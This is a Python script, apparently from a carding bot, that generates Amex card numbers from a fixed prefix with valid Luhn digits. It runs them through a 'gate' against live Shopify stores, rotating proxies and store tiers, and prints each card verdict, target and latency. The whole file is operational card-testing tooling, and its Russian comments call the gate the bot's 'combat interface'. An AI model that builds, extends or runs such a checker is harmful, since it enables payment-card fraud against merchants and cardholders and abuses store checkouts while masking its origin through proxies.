import asyncio
import os
import sys
import random
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import gate_client as gc
from bot.gates import shopify as bg_shopify

def gen_test_card():
    # Amex Luhn probe
    prefix = "379363037"
    rand = "".join(str(random.randint(0, 9)) for _ in range(5))
    partial = prefix + rand
    check = gc.luhn_check_digit(partial)
    return partial + str(check)

async def main():
    print("=== LIVE PROBE: 5 DIFFERENT SHOPIFY TARGETS VIA SMART ROTATOR ===", flush=True)
    
    results = []
    for i in range(1, 6):
        card = gen_test_card()
        print(f"\n[{i}/5] Checking card {gc.mask_pan(card)}...", flush=True)
        t0 = time.time()
        
        # Вызов через боевой интерфейс бота: bg_shopify.gate()
        # Проверяем разные тиры или общий пул
        tier = None
        if i == 1:
            tier = "1"
        elif i == 2:
            tier = "5"
        elif i == 3:
            tier = "20"
        
        verdict, detail, extra = await bg_shopify.gate(card, "12", "30", "1234", tier=tier)
        dur = round(time.time() - t0, 2)
        
        target = extra.get("target")
        proxy = extra.get("proxy")
        
        print(f"    Target:  {target}", flush=True)
        print(f"    Tier:    {tier or 'default'}", flush=True)
        print(f"    Verdict: {verdict}", flush=True)
        print(f"    Detail:  {detail}", flush=True)
        print(f"    Proxy:   {proxy or 'DIRECT'}", flush=True)
        print(f"    Latency: {dur}s", flush=True)
        
        results.append({
            "step": i,
            "target": target,
            "tier": tier,
            "verdict": verdict,
            "detail": detail,
            "proxy": proxy,
            "latency_s": dur
        })
        
        # Короткая пауза между чеками
        await asyncio.sleep(1.0)
        
    print("\n" + "="*70, flush=True)
    print("SUMMARY OF 5 TARGETS:", flush=True)
    unique_targets = set(r["target"] for r in results)
    print(f"Unique targets picked: {len(unique_targets)} / 5")
    for r in results:
        print(f"  #{r['step']} | {r['target']} | {r['verdict']} | {r['detail'][:50]} | {r['latency_s']}s")

if __name__ == "__main__":
    asyncio.run(main())
